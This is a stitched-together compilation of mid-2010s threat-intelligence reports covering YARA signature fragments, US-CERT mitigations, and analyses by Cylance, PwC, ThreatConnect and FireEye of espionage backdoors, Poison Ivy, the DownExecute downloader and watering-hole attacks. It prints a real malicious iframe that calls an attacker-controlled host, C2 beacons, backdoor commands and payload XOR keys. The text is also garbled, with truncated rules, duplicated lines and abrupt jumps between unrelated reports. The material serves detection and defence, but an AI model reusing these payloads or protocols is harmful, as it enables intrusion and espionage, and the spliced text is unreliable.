4C 24 4C 0F 8C ( AE | AD) FE FF FF 6A 00 55 E8 ????????83 C4 08 53 FF 15 ??????????????6a 00 6a 00 6a 00 56 ffD5 56 ff 15????????0750D68F8030000E8??00000059EB0A83F8027518E8????000085C0750FFF35???????0FF15???????033C0C36A0158C3}

$heapCreateFunction =

{558BECB82C120000E8????FFFF8D8568FFFFFF5350C78568FFFFFF94000000FF1????????085C0741A83BD78FFFFFF02751183BD6CFFFFFF0572086A0158E9020100008D85D4EDFFF68901000005068???????0FF15???????085C00F84D000000033DB8D8DD4EDFFFF389DD4EDFFFF74138A013C617C083C7A7F042C20880141381975ED8D85D4EDFFFF6A165068???????0E8????000083C40C85C075088D85D4EDFFFFEB498D8564FEFFFF68040100005053FF15???????0389D64FEFFFF8D8D64FEFFFF74138A013C617C083C7A7F042C20880141381975ED8D8564FEFFFF508D85D4EDFFFF50E8????????59593BC3743E6A2C50E8????????593BC3597430408BC83818740E80393B75048819EB0141381975F26A0A5350E8????000083C40C83F802741D83F803741883F80174138D45FC50E898FEFFFF807DFC06591BC083C0035BC9C3}

$getMajorMinorLinker =

{568B7424086A00832600FF15???????06681384D5A75148B483C85C9740D03C18A481A880E8A401B8846015EC3}

$openServiceManager =

{FF15???0?0?08B?885??74????????????????5?FF15???0?0?08B????Actual impact to organizations may vary depending on the type and number of systems impacted.Tactical Mitigations

      Implement the indicators of compromise within your systems for detection and mitigation purposes.Encourage users to transfer critical files to network shares, to allow for central backed up.Execute daily backups of all critical systems.Periodically execute an “offline” backup of critical files to removable media.Establish emergency communications plans should network resources become unavailable.Isolate any critical networks (including operations networks) from business systems.Identify critical systems and evaluate the need for having on-hand spares to quickly restore service.Ensure antivirus is up to date.Disable credential caching for all desktop devices with particular importance on critical systems such as servers and restrict the number of cached credential
     for all portable devices to no more than three if possible.This can be accomplished through a Group Policy Object (GPO).Disable AutoRun and Autoplay for any removable media device.Prevent or limit the use of all removable media devices on systems to limit the spread or introduction of malicious software and possible exfiltration data,
     except where there is a valid business case for use.This business case must be approved by the organization Chief IT Security Officer, with policy/guidance
     on how such media should be used.Consider restricting account privileges.It is our recommendation that all daily operations should be executed using standard user accounts unless
     administrative privileges are required for that specific function.Configure all standard user accounts to prevent the execution and installation of any unknown
     or unauthorized software.Both standard and administrative accounts should have access only to services required for nominal daily duties, enforcing the
     concept of separation of duties.Lastly, disable Web and email capabilities on administrative accounts.Compromise of admin accounts is one vector that
     allows malicious activity to become truly persistent in a network environment.Ensure that password policy rules are enforced and Admin password values are changed periodically.Consider prohibiting hosts within the production environment or DMZ from sharing an Active Directory enterprise with hosts on other networks.Each
     environment should have separate forests within Active Directory, with no trust relationships allowed between the forests if at all possible.If necessary, the
     trust relationships should be one-way with the low integrity environment trusting the higher integrity environment.Consider deployment of a coaching page with click through acceptance; these are traditionally deployed in an environment to log the acceptance of network
     acceptable use policy or to notify users of monitoring.Coaching pages also provide some measure of protection from automated malicious activity.This
     occurs because automated malware is normally incapable of physically clicking an acceptance radial button.Automated malware is traditionally hardcoded to
     execute, then retrieve commands or additional executables from the Internet.If the malware is unable to initiate an active connection, the full train of infection
     is potentially halted.The danger still exists that the physical user will authorize access, but through the use of coaching pages, infections can be limited or at
     least the rate of infection reduced.Monitor logs -- Maintain and actively monitor a centralized logging solution that keeps track of all anomalous and potentially malicious activity.Ensure that all network operating systems, web browsers, and other related network hardware and software remain updated with all current patches and
     fixes.Strategic Mitigations

     Organizations should review Security Tip Handling Destructive Malware #ST13-003 and evaluate their capabilities encompassing planning, preparation,
     detection, and response for such an event.Always keep your patch levels up to date, especially on computers that host public services accessible through the firewall, such as HTTP, FTP, mail, and
     DNS services.Build host systems, especially critical systems such as servers, with only essential applications and components required to perform the intended function.Any unused applications or functions should be removed or disabled, if possible, to limit the attack surface of the host.Implement network segmentation through V-LANs to limit the spread of malware.Consider the deployment of Software Restriction Policy set to only allow the execution of approved software (application whitelisting)

     Recommend the whitelisting of legitimate executable directories to prevent the execution of potentially malicious binaries.Consider the use of two-factor authentication methods for accessing privileged root level accounts or systems.Consider deploying a two-factor authentication through a hardened IPsec/VPN gateway with split-tunneling prohibited for secure remote access.Deny direct Internet access, except through the use of proxies for Enterprise servers and workstations.Perform regular content filtering at the proxies or
     external firewall points of presence.Also consider the deployment of an explicit versus transparent proxy policy.Implement a Secure Socket Layer (SSL) inspection capability to inspect both ingress and egress encrypted network traffic for potential malicious activity.Isolate network services, such as email and Web application servers by utilizing a secure multi-tenant virtualization technology.This will limit the damage
     sustained from a compromise or attack of a single network component.Implement best practice guidance and policy to restrict the use of non-Foundation assets for processing or accessing Foundation-controlled data or systems
     (e.g., working from home, or using a personal device while at the office).It is difficult to enforce corporate policies, detect intrusions, and conduct forensic
     analysis or remediate compromises on non-corporate owned devices.Minimize network exposure for all control system devices.Control system devices should not directly face the Internet.Place control system networks behind firewalls, and isolate or air gap them from the business network.When remote access is required, use secure methods, such as Virtual Private Networks (VPNs), recognizing that VPN is only as secure as the connected
     devices.Industrial Control System (ICS)-CERT and US-CERT remind organizations to perform proper impact analysis and risk assessment prior to taking defensive
     measures.References
     N/A
Revisions
     December 19, 2014: Initial Release



                                       This product is provided subject to this Notification and this Privacy & Use policy.Cylance SPEAR Team: A Threat Actor Resurfaces

May 13, 2015
By Jon Gross(http://blog.cylance.com/author/jon-gross)

Share This:

Attackers typically shut down campaigns or halt activity after they are exposed by security researchers,
thereby creating the impression they have dropped off the map.This often leads to a false sense of security
within the community and perpetuates the idea that public exposure makes us all safer.While the exposed
activity is no longer observed, attackers simply continue in the background – evolving or altering their tactics
to seamlessly continue operations with increasingly advanced malware.So while potentially making us safer
in the short-term, exposure often forces a Darwinian evolution in malware.Several months ago I examined a malware-tainted Word document titled “ISIS_twitter_list.doc.” I didn’t think
much of it and quickly moved on after a cursory analysis.Yet I recently uncovered evidence that suggests it
was the work of a well-known Chinese threat group.This group is known to have targeted U.S. government
agencies, defense contractors, aerospace firms and foreign militaries since 2009.Until now, it was widely
believed the actor's activities had largely subsided in 2013, following numerous public disclosures and
detailed analyses of their backdoors.Our technical analysis shows the group has remained active.We are releasing this data to help victims
identify and remediate the threat.Click here(http://blog.cylance.com/spear-a-threat-actor-
resurfaces#mitigation) to get to recommended mitigations, or for all the technical details read on:

It all began with the MIME encoded document "ISIS_twitter_list.doc", which exploited the familiar CVE-2012-
0158(http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0158) and was first uploaded to
Virustotal from a user in India.Other targets identified were predominantly located in Australia, New
Zealand, Vietnam and the United States.File Details 

ISIS_twitter_list.doc 
6ba1d42c6493b18548e30bd60ca3d07a140d9d1945cf4e2b542e4a6d23913f40
146,338 bytes 

Name
SHA256
File Size
The first stage shellcode searches for the marker "GfCv" then checks the next four bytes are "EF FE EC CE" in
the document then decodes the second stage shellcode using the four-byte XOR key "0x29F7C592".This
second stage finds and decodes an encoded executable beginning at offset 0x33A2.The binary is encoded using a variable 4-byte XOR key that is generated by starting with the 4-byte key
0x7FFEFC00; this XOR key is then permutated every four bytes by rotating the first two bytes of the key by
0x1 and shifting the bits of the next two bytes right by 0x1, so the next 4-byte XOR key in the series would be
0x3FFF7E00.It includes some logic to exclude XOR'ng any bytes that match 0x00000000 or the current 4-
byte XOR key.For the binary mathematically impaired like myself the 4-byte keys will eventually repeat in effect creating a
256-byte XOR key.The decoded binary will be written to the filesystem as
"%APPDATA%\Microsoft\Systemcertificates\Certificates.ocx".File Details

Full File Path
SHA256
File Size
Compile Time

%APPDATA%\Microsoft\Systemcertificates\Certificates.ocx 
9d838fd9d21778ed9dc02226302b486d70ed13d4b3d914a3b512ea07bf67e165 
107,008 bytes 
2/4/2015 8:41:42 UTC

 

The malware does not execute immediately after successful exploitation and instead just creates a Run key
in the current user's hive which will execute the next time the victim user accesses the system.Registry Persistence Key
Registry Key Value
 

  HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Certificates 
  Rundll32.exe "%APPDATA%\Microsoft\SystemCertificates\Certificates.ocx",Setup

The ocx file is actually a DLL and provides the attacker the ability to upload, download, enumerate, delete,
search, and execute files as well as list drivers on the system.The binary is designed to be called from its one
exported function, "Setup"; the Run key will ensure that whenever the victim user logs into the system the
backdoor will execute.The binary is configured to communicate to "www.microsoftservices.proxydns.com"
on port 80 using standard HTTP POST and GET requests.The domain at the time of this report resolved to
the IP address, "103.229.125.157".Additionally the dynamic DNS domains "fighthard.mooo.com" and
"rampage.freetcp.com" have both historically resolved to this IP address.Then RC4 decrypting the
resulting string using the first four bytes of the payload as the decryption key.Based upon some cursory analysis the backdoor will look for encrypted commands within HTML comments
returned from the C2 using the following format: "<!­­?*$@COMMAND GOES HERE@$*?­­!>;" however,
the C2 was not active at the time of analysis so this could not be confirmed.The backdoor may also make
requests to the C2 over HTTP using the following parameters in the URI string "query?sid=" and "result?sid=".The PDB path, C:\Codes\Eoehttp\Release\Eoehttp.pdb, was also left in the backdoor although no
other instances of this path could be identified.Several additional exploit documents were identified by
investigating the domains "fighthard.mooo.com" and "rampage.freetcp.com".Down the Intelligence Rabbit Hole

Fighthard.mooo.com additionally resolved to 173.224.214.12 in February of 2014.SHA256
Name
File Size
 

8794189aad922f2287a56c5e2405b9fd8affd136286aad7ed893b90cd2b76b9c 
 Naval Science Curriculum 2014.doc
459,087 

The document exploits old faithful, CVE-2012-0158(http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0158), but instead of using a MIME encoded document this file was just a plain RTX
document.Yes that's not a misspelling Word is happy to open this RTF format as well.So for anyone
exploring and hunting RTF documents you may also want to start looking for the "{\rtx" header.We'll skip
the shellcode analysis for now and go directly to the binary which is stored beginning at offset 0x1BC27 as
an ASCII hex-encoded, xor-encoded binary.It can be decoded using the XOR key "0xBF".Upon successful
exploitation the decoded binary will be written first to %TEMP%\dw20.EXE then copied to
%WINDIR%\msascm32.drv.No other changes are made to the system.File Details

Full File Path:
SHA256:
File Size: 
Compile Time:
 

%WINDIR%\msacm32.drv 
67bd81f4c5e129d19ae71077be8b68dc60e16c19019b2c64cdcedca1f43f0ae3 
108,544 Bytes 
9/26/2013 01:46:23 UTC

I'm always curious when no registry changes are made in the exploitation process.At first the backdoor
failed to load or really do anything in my VM until I read what the "msascm32.drv" file does.Looking at the
original file's (%WINDIR%\system32\msacm32.drv) imported functions, it's clear the DLL is responsible for
some type of audio processing and/or playback.A quick search on the internet confirmed this so I added a
soundcard to my VM.On reboot explorer.exe was now happy to load the backdoor and get down to business; this technique is
known as dll search order hijacking or binary planting.Interestingly the backdoor will also load the legitimate
system32\msacm32.drv file resolve functions and pass calls to it so it doesn't break audio playback on the
victim system.The backdoor contains identical exports as well as an additional dummy function from the
legitimate msacm32.drv called "StartWork" which can be used to reliably identify similar samples.The
backdoor routine exists inside the DllMain function so when explorer.exe loads the backdoor via
LoadLibrary it will begin spawning malicious threads.A PDB path was also left in this binary C:\Users\cmd\Desktop\msacm32\Release\msacm32.pdb; A quick
google search will lead you to a YARA rule written by Patrick Olsen and the very similar sample
869fa4dfdbabfabe87d334f85ddda234 which communicates to www.micro1.zyns.com on TCP port 80.The
two files also have an identical compilation time, which suggests the backdoor is probably not recompiled
very often and instead the attacker simply updates the callback configuration information.The backdoor interestingly contains the well known Poison Ivy RAT shellcode as well as its own custom
backdoor.It will first attempt to communicate to fighthard.mooo.com using the poison ivy binary protocol
with the default connection password of "admin".The Poison Ivy shellcode is encrypted using a custom
cipher with the key "Tiger324{" beginning at offset 0xFA5 and ending at 0x159E.If this initial connection fails
it will revert to the secondary backdoor, which utilizes HTTP GET and POST requests somewhat similar to the
ones described above to the internal IP address "192.168.2.26".This suggested the attacker had already
compromised other systems in the environment and was using an internal C2 mechanism for a fallback.Example Internal Beacon: 

GET /login.asp?p*hWe8J5pF*k5xv5XeUhIJbKZQfySZRv1NcwhQi2ZHKKvGBC8EjiadbWLoUcgUxJyZElD7AY0DCWmzbIa9IX
EJ7OZkvwBZVx1JsrhQ== HTTP/1.1 

User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32) 

Host: 192.168.2.26 

Requests may also be made to the following pages: "check.asp", "result.asp", and "upload.asp".The request
structure is slightly different in that it uses the base64 alphabet
"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+*".The resulting request can
be decoded further by using the first 16 bytes of the result as an XOR key to decode the rest of the payload.It also uses a static User-Agent string of "Mozilla/4.0 (compatible; MSIE 8.0; Win32)" for each request."123" is a campaign identifier hard coded into the backdoor.I
don't know what "000000+" is but it's also a hard coded value; my best guess is it's to modify the timezone of
the timestamp."USER-D6921F6215" is the hostname of the victim, "Administrator" is the victim user,
"1676096002" is the current Date/Time in decimal, and "1.0" is a version number also stored in the
backdoor.The 16-byte XOR key will be randomly generated per each request.Results from commands will
be sent back encoded to the server to the "result.asp" page.The backdoor will accept the following commands:  

#runhfcore- starts the main PI backdoor functionality in a separate thread 
#getdrivelist?- enumerates logical drives on the system 
#getfilelist?- enumerates logical files using FindFirst FindNext technique 
#delfile- deletes a file using the DeleteFileA API 
#newupload?- uploads a file 
#newdownload?- downloads a file 
#runfile- - executes a file on the system via CreateProcess API 
#urldownload?- will download a file from a remote URL using InternetOpen and InternetReadFile 
#sleep?- Sleeps for a specified number of minutes
#delay?- exact functionality unknown appears to force another request to the C2 page check.asp 
#maxblock?- exact functionality unknown appears to force another request to the C2 page
check.asp 
#stop!- exact functionality unknown appears to force another request to the C2 page check.asp 
 

Commands with a ?appear to take an additional parameter while files that end in - require a full file path.The backdoor is also capable of elevating its privileges on win7 and above using a method similar to the one
described here: http://www.pretentiousname.com/misc/win7_uac_whitelist2.html.I thought it was
interesting the backdoor used a secondary backup backdoor in addition to its primary payload.The first communicated directly outside the network using a well known RAT protocol and if that failed the
secondary much stealthier backdoor communicated to an internal C2 address using it's own custom
encoded HTTP based protocol.The use of a relatively undisclosed DLL search order hijack also made this

sample unique.Detection rates for this binary seem to be pretty good right now 39/57; however, at the time
it was first used in late January 2014 detection rates were much poorer.Other samples from the identified
exploit documents were similar to the one described above with different network callbacks.And now to tie all this back to the "well-known" threat group.The "173.224.214.12" IP address that
"fighthard.mooo.com" previously resolved to also historically had two other domains point to it
"queenberry.www1.biz" and "word.crabdance.com"."word.crabdance.com" previously resolved to
"64.71.162.70" on September 8, 2012 and 108.171.246.140 on February 19, 2014.The "64.71.162.70"
address and the associated domain "www.ollay011.zyns.com" are rather infamous and the first mention of it
I could find is in this shadowserver post: http://blog.shadowserver.org/2012/04/16/beware-of-what-you-
download-recent-purported-ceiec-document-dump-booby-trapped/ related to exploit documents identified
in a data dump from Hardcore Charlie.If you follow the rabbit hole deep enough you can eventually trace
samples via domain and IP address crossover back to the FBI flash #A-000009-MW from mid 2013.Additional domains and IP addresses related to this group are included in the appendix.Mitigation

While defending against the constant stream of new malware from advanced threat groups may be difficult,
organizations can take some relatively easy steps to help identify intrusions.This group is among the
numerous threat actors who rely almost exclusively on Dynamic DNS infrastructure.They seem to prefer
ChangeIP (https://www.changeip.com/services/free-dynamic-dns/(https://www.changeip.com/services/free-
dynamic-dns/)) and Afraid (https://freedns.afraid.org/(https://freedns.afraid.org/)) for free DNS services,
although they previously heavily used Sitelutions
(https://sitelutions.com/info/sldns(https://sitelutions.com/info/sldns)).While there are some legitimate
instances of dynamic DNS in corporate environments, it only accounts for a small percentage of traffic.Monitoring and/or blocking dynamic DNS requests should help detect attacks by this actor.Any dynamic
DNS domains that resolve to non-routable IP addresses, like 127.0.0.1 or private IP addresses, should be
thoroughly investigated.The HTTP traffic generated by both samples uses a limited number of header fields,
which is substantially different from the majority of traffic generated by modern browsers.As always, don't
open E-mail attachments from untrusted parties.Attacks against Israeli & Palestinian interests
27 April 2015
By Tom Lancaster

Follow @tlansec 
Executive Summary
This short report details the techniques being used in a series of attacks mostly against Israel­based
organisations.The decoy documents and filenames used in the attacks suggest the intended targets
include organisations with political interests or influence in Israel and Palestine.Although we are unable
to link this campaign to any already documented in open source, it bears similarities to some described
by others previously[1],[2].The earliest samples in the campaign we have identified date back to the summer of 2014.The number
of samples discovered and relatively small scale of infrastructure suggest the attackers have limited
resources with which to conduct attacks.Introduction
Our investigation begins by taking a look at the following file:
ecc240f1983007177bc5bbecba50eea27b80fd3d14fd261bef6cda10b8ffe1e9.According to the analysis
published on malwr.com[3], this file was originally named ‘Israel Homeland Defense Directory 2015
_Secured_.exe’ and, once executed, the following decoy document was presented:        

Attacks against Israeli & Palestinian interests- Cyber security updatespwc.blogs.com Updated Apr 27th, 2015The initial file in this case is a self­extracting RAR file that contains three components, including a decoy
document (in this case, the PDF shown above) and the malware.Further inspection of the malware extracted showed it wasn’t a family our analysts recognised.This,
coupled with the nature of the decoy document used, led us to take a more in depth look at the malware,
and associated infrastructure.We’d like to give special thanks to Eyal Sela of ClearSky Security for his collaborative efforts in this
research.Delivery
The most common way this malware packaged is via a self­extracting RAR file; however the attackers
also appear to have used a number of other solutions to drop their malware, including a Visual Basic
based wrapper and an Auto­IT based wrapper.In terms of how the malware is delivered, it’s most likely that it’s done via spearphishing.For example,
there are also several occasions where the VirusTotal ‘ITW’ tab suggests that the original dropper was
available to download on a 3rd party website.In the case of the sample discussed in the introduction we
can see:

Pomf.se is a relatively low­profile file sharing/hosting website currently based in Sweden.The use of

Pomf.se is a relatively low­profile file sharing/hosting website currently based in Sweden.The use of
low­key file­sharing sites appears to be a feature of the campaign as far as we can tell, with a few other
similar sites being used in the same way.This, in conjunction with the nature of the related files we have discovered (all of them are directly
executable files) means it is likely that the malware is primarily delivered via spear phishing attempts,
rather than any other method.DownExecute – Brief Analysis
In this analysis, we’ll go over the file with a SHA256 hash of
ecc240f1983007177bc5bbecba50eea27b80fd3d14fd261bef6cda10b8ffe1e9.We’ve chosen to refer to the malware as ‘DownExecute’ due to the .pdb string left in the malware
(leaving debug paths in malware seems to be very fashionable at the moment…):

All variants of the DownExecute’ malware we’ve identified come packaged in the following fashion:

From the samples we have analysed so far, the decoy application included is never used by the binary,
and is presumably included so that anyone taking a cursory look at the file will conclude it is in fact the
real deal.Whilst the cURL[4] binary included is used for internet connectivity but it’s currently unclear
why the attackers chose to use this method of adding connectivity to their file.Some of the binaries are also self­signed:

 

So what can this malware do?Not all that much – it’s just a downloader.After successful compromise…
It appears as though the clue for the main functionality of this malware is in its name (it downloads, and
then executes) files, as it offers little else for the attacker.The DownExecute malware is used as a way
for the attackers to gain an initial foothold on the victim machine.The basic information reported back by
the malware would also certainly allow the attacker a way to triage infections to ensure they had
reached their intended victim rather than a researcher.We don’t have great visibility into post­compromise activity at this stage; however there are a number of
other malware samples which communicate with the same infrastructure as the DownExecute samples.It’s not unreasonable to infer that if these are more fully featured backdoors, that they are likely the 2nd
stage malware families used in conjunction with DownExecute.Specifically, we’ve observed the well­
documented Xtreme RAT and Poison Ivy malware families in use with the same domain names as
DownExecute.The Poison Ivy passwords observed for the group were ‘admin2014’ and ‘admin!@#$%”.Command & Control Infrastructure

The vast majority of infrastructure in terms of hostnames observed associated with these attacks have
been dynamic DNS domains, primarily associated with no­ip.com.This provider is popular with several
Middle Eastern threat actors tracked by PwC’s intelligence team.In terms of the size of the infrastructure
used in the campaign using the tools described, it’s also fairly small, as shown on our Maltego graph.The attackers have made an unusual choice with respect to the hosting providers used for the malicious
infrastructure.Most of the domains at the time of writing, and indeed historically, have pointed to IP
address space owned by Host Sailor, geo­located in Belize.Many of the threat actors in the Middle East
that we’re familiar with have extremely volatile IP hosting, owing to the fact that the infrastructure is likely
to be hosted on their own networks.This remote hosting therefore somewhat bucks the trend of some of

to be hosted on their own networks.This remote hosting therefore somewhat bucks the trend of some of
the other actors we see from the region.Inferred Targeting
As we have mentioned in a number of our other reports[5], attackers often use C&C domains which
contain phrases relevant to their targets so as to make them appear legitimate.With this in mind we
performed some simple analysis on the domain names used in this campaign to identify legitimate
organisations being impersonated.So do we believe this campaign is focused only at
Israeli companies?Perhaps not entirely.Targeting
Whilst there are a number of documents clearly aimed at Israeli nationals , using political and military
themes, one of the lures[6] included an Arabic language decoy document pictured below:

The document in question discusses an alleged leak of information relating to Abbas, leader of the
Palestine Liberation Organization.Whilst this is a subject which is clearly of key interest to all parties in
the region, the fact the attackers sent an Arabic language version of the story may indicate that the
recipient was expected to be fluent in Arabic, and possibly therefore less likely to be Israeli, but rather

someone from another adjacent region.Conclusion
Whilst, in this case, we’re unable to attribute this set of activity to a specific group or entity in the Middle
East, it does bear a significant resemblance to many attacks seen from the Middle East that have been
previously documented.This is consistent with the complex
relationships between the different nations and political groups in the region;
Password schema: In their August 2013 blog[7], FireEye noted that a group they refer to as
MoleRats used Poison Ivy and Xtreme RAT, in conjunction with a password of “!@#GooD#@!” The
keyboard walk used for the symbols “!@#” across the top of a keyboard is similar to the password
observed in some of our Poison Ivy samples.The fact that the attackers chose to develop their own dropper may be indicative that their biggest
problem when conducting network intrusions is getting their foot in the door – particularly as it seems as
though they still prefer the more fully featured Poison Ivy and Xtreme RAT backdoors as 2nd stage
malware families.When we pivoted and looked for the earliest examples of the DownExecute malware, the first samples
we could find were compiled in June 2014.We have no reason to believe in this case that the threat
actor has tampered with the compile time on any samples, as all other samples discovered were
identified shortly after they were compiled.As such we believe the campaign using this downloader
malware has been on­going for approximately 12 months."User­Agent:"; http_header; content:!"Referer:"; http_header;

http_method; content:!"User­Agent:"; http_header; content:!"Referer:"; http_header;
content:!China Hacks the Peace Palace: All Your EEZ’s Are Belong to Us

Executive Summary

In early July 2015, Chinese APT actors used an Adobe Flash Player exploit within a specific webpage
detailing a noteworthy international legal case between the Philippines and China.This precedent setting
legal case would be followed by many Southeast Asian nations, as well as others around the globe.The
exploit appeared on day three of the Permanent Court of Arbitration tribunal, exposing an untold number
of interested parties that visited the webpage to potential exploitation.When considered holistically, the intelligence supports the conclusion that this exploitation campaign was
purposefully carried out against the backdrop of diplomatic and legal maneuvering.Despite Beijing’s
unwillingness to participate in the international arbitration and their rejection of the PCA’s jurisdiction,
there appears to be a distinct effort to surreptitiously target those who are interested in this landmark
international legal case via electronic means.ThreatConnect has shared the details of this incident to our Common Community within Incident
20150710D: Permanent Court of Arbitration Flash Exploit.Log into your ThreatConnect account or
register for one via our Community Editions and access the most comprehensive and widely adopted
Threat Intelligence Platform on the market.Hacking the Peace Palace

Since the revelation of an Adobe Flash Player zero day exploit exposed as part of the leaked “Hacking
Team” arsenal on July 6th 2015 (designated CVE-2015-5119), the ThreatConnect Intelligence Research
Team has been monitoring its adoption by other malicious actors that are not tied to “Hacking Team”.On Thursday, July 9, 2015 ThreatConnect observed that a CVE-2015-5119 exploit was embedded
strategically within the website for the Permanent Court of Arbitration (PCA), 72 hours after the exploit
was disclosed publicly.The significance of this is that the PCA is an “intergovernmental organization
providing a variety of dispute resolution services to the international community” located at the “Peace
Palace” within The Hague, Netherlands.The 102-year-old Peace Palace is a historic fixture within the
sphere of international law because it also houses the International Court of Justice, the principal judicial
body of the United Nations, as well as other bodies and resources that uphold and support international
laws and norms to which many nations adhere.The exploit was posted to the PCA website during the first round of arguments of a notable international
legal case where the Philippines is contesting Chinese territorial expansion within the South China Sea
(SCS), specifically challenging encroachment into the Philippines exclusive economic zone (EEZ).These arbitral proceedings were initially instituted by the Republic of the Philippines against the People’s
Republic of China under Annex VII of the United Nations Convention on the Law of the Sea (UNCLOS) on
January 22, 2013.Two years later, on July 09, 2015, an attacker compromised the official PCA webpages at:

[http:]//www.pca-cpa[.]org/showpage.asp?pag_id=1529
[http:]//www.pca-cpa[.]org/showproj.asp?pag_id=1529

This exploitation was almost certainly not a random compromise of the PCA website; rather, it occurred

during the initial phase of the legal proceedings.The exploit itself was embedded within the very pages
that specifically described the legal case of The Republic of the Philippines v. The People’s Republic of
China.According to URLQuery, the attackers placed a CVE-2015-5119 Flash Exploit at the malicious URL
[http:]//pic.nicklockluckydog[.]org/movie.swf, and altered the PCA webpages to load that URL when
visited.The domain pic.nicklockluckydog[.]org resolved to the IP address 192.243.116[.]241 (Phoenix, Arizona,
US) at the time of initial exploitation.IP Address 192.243.116[.]241 is owned by IT7 Networks, Inc., which
provides self-managed Virtual Private Server (VPS) infrastructure.The attackers shifted the domain later,

resolving to IP Address 108.61.117[.]9 (Haarlem, Netherlands) on Friday, July 10th, the very day that the
tribunal convened in The Hague.The malware payload associated with this exploit has been identified as MD5:
B4522D05A9E3A034AF481A7797A445EA (Rdws.exe).This payload is a dropper executable that deploys
its main malware component using a dynamic link library (DLL) sideloading technique, where a malicious
DLL is dropped alongside a legitimate program executable that will load that malicious DLL by filename.In this instance, the attackers leveraged the legitimate Google Chrome Frame Helper executable MD5:

DFDC5B09C4DEA79EB7F5B9E4E76EECF9 (LMS.exe) with the malicious sideload DLL file MD5:
2EE25DE7BD6A2705F3F8DDE0DD681E96 (dbghelp.dll).LMS.exe will load any DLL file name
dbghelp.dll that is found in the same path, hence the sideloading technique.In turn, The malicious DLL
loads a backdoor binary blob MD5: 16E5A27BD55E0B4E595C9743F4C75611 (ticrf.rat).The malware connects back to the exploit domain pic.nicklockluckydog[.]org as well as the subdomain
ssl.nicklockluckydog[.]org.The domain ssl.nicklockluckydog[.]org resolved to 175.45.233[.]205 (Seoul,
South Korea) at the time of analysis.ThreatConnect also uncovered a related malware sample MD5: 5877D15215B7F398319F0DE7BA7B1947,
which was submitted to Malwr.com on July 15, 2015.This malware implant matches the type used above,
and leverages the C2 domains books.blueworldlink2015[.]net and vpn.nicklockluckydog[.]org.The former
domain resolves to the same Netherlands IP 108.61.117[.]9 which resolved pic.nicklockluckydog[.]org on
July 10th.blueworldlink2015[.]net was registered by the email address nicklock2004[@]aol[.]com, which
noticeably uses the same “nicklock” pseudonym found in the domain nicklockluckydog[.]org, and uses the
falsified address info “zhongguohunansheng” Beijing, China.The domain nicklockluckydog[.]org was registered on July 9th, 2015 at 06:22Z by a Chinese domain
reseller using falsified information such as the name Lanny Chen and address 7946 N Bridle Creek Way in
Xiamen, Taiwan.On an interesting note, the registration address 7946 N Bridle Creek Way is the same
observed within a civil suit between the National Football League and various Chinese domain resellers
originally filed in May 2014.Conclusion

In early July 2015, Chinese APT actors would operationalize an Adobe Flash Player exploit within 72
hours of its public disclosure, strategically staging it within a specific webpage detailing a noteworthy
international legal case between the Philippines and China.This precedent setting legal case would be
followed by many Southeast Asian nations, as well as those around the globe.The exploit appeared during
the first round of hearings, exposing an untold number of interested parties that visited the webpage.The
tactic of leveraging strategic website compromises with patched or unpatched exploits is a well known

observable which has been used consistently by various APT groups in recent years.When considered holistically, the intelligence supports the conclusion that this exploitation campaign was
purposefully carried out against the backdrop of diplomatic and legal maneuvering.Manila has long
recognized they are unable to independently lock horns with China diplomatically or militarily, by
invoking dispute settlement procedures under the UNCLOS, an agreement in which both China and the
Philippines are signatories.The Philippines is seeking to leverage international law to level the playing
field against China’s regional diplomatic and military dominance, the ultimate goal being to deter
aggressive Chinese expansion activities within the Philippine EEZ and the broader South China Sea.Despite Beijing’s unwillingness to participate in the international arbitration and their rejection of the
PCA’s jurisdiction, there appears to be a distinct effort to surreptitiously monitor those who are interested
in this landmark international legal case via electronic means.This vignette also highlights the critical difference between threat data and threat intelligence.The latter
goes beyond simply pulling in a stream of open source indicators and blindly pushing them to your
enterprise network security devices and SIEM tools hoping something hits (it works great; you’ll get TONS
of hits…or misses, depending on your perspective).A true Threat Intelligence Platform enables tactical,
operational, and strategic analysis of the details behind the technical how within the context of the non-
technical, socio-political why.ThreatConnect has previously shared Threat Intelligence research of espionage activity tied to the
increasing tensions within the South China Sea.In a similar fashion, ThreatConnect has shared
additional details of this incident to our Common Community within Incident 20150710D: Permanent
Court of Arbitration Flash Exploit.Log into your ThreatConnect account or register for one via our
Community Editions and access the most comprehensive and widely adopted Threat Intelligence Platform
on the market.Aided Frame, Aided Direction (Because it’s a redirect)
Introduction:

On September 24 2014, FireEye observed a new strategic web compromise (SWC) campaign that we
believe is targeting non-profit organizations and non-governmental organizations (NGO) by hosting
iframes on legitimate websites.The compromised websites contained an iframe to direct site visitors to a
threat actor-controlled IP address that dropped a Poison Ivy remote access tool (RAT) onto victims’
systems.FireEye has not yet attributed this activity though we have identified links to the Sunshop Digital
Quartermaster, a collective of malware authors that supports multiple China-based advanced persistent
threat (APT) groups.FireEye previously established detection measures for this threat activity, ensuring
our clients were prepared for these intrusion attempts well in advance of threat actor implementation.Activity Overview:

On September 24, FireEye observed SWCs, likely conducted by a unitary threat group based on shared
infrastructure and tools, on at least three different websites: an international non-profit organization that
focuses on environmental advocacy, and two different NGOs that promote democracy and human rights.The group was able to compromise these websites and insert malicious iframes.Figure 1 displays one of
the iframes.The threat group obfuscated the iframe on two of the compromised websites.<div class=”views-field views-field-body”>  <div class=”field-
 content”><p><iframe height=”0″
 src=”http://103.27.108.45/img/js.php” width=”0″></iframe></p>

Figure 1: The iframe that directed website visitors to a threat actor-controlled IP address

The iframes on these websites directed visitors to Java exploits hosted at 103.27.108.45.In turn, these
exploits downloaded and decoded a payload hosted at: hxxp://103.27.108.45/img/js.php.A GET request
to this URI returned the following content:

<applet code=”NvTest.class”,height=”200″ width=”200″>

.<param name=”bin” value=’4D5A90……’

Figure 2: The encoded payload (snipped for brevity)

The ‘bin’ param shown in Figure 2 is decoded from ASCII into hex by the Java exploit.Once decoded,
FireEye identified the payload as a Poison Ivy variant.InternalName: chrome_exe
ProcuctShortName: Chrome
FileVersion: 34.0.1847.131
CompanyName: Google Inc.
OrginaLFilename: chrome.exe
LegalTrademarks:
ProductName: Google Chrome
ComparyShortName: Google
LastChange: 265687
FileDescription: Google Chrome
Offcial Build: 1
PriductVersion: 34.0.1847.131
Translation: 0×0409 0x04b0

